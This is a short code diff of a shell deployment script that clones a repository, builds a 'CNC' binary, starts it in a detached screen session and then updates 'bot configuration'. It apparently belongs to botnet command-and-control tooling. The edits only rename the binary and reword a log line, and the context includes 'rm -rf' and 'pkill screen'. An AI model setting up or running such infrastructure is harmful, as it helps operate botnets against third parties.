@@ -90,17 +90,17 @@ rm -rf "$WORK_DIR"
 mkdir -p "$WORK_DIR"
 cd "$WORK_DIR"
 
-log INFO "Cloning repository from $REPO_URL"
+log INFO "Cloning repository from GitHub"
 git clone "$REPO_URL" source >/dev/null 2>&1
 cd source
 
 log INFO "Building CNC"
 cd cnc
-go build -o cnc_binary main.go >/dev/null 2>&1 || { log ERROR "CNC build failed"; exit 1; }
+go build -o cnc main.go >/dev/null 2>&1 || { log ERROR "CNC build failed"; exit 1; }
 
 log INFO "Starting CNC in screen session 'cnc'"
 pkill screen 2>/dev/null
-screen -dmS cnc ./cnc_binary
+screen -dmS cnc ./cnc
 log INFO "CNC started. View with: screen -x cnc"
 
 log INFO "Updating bot configuration"
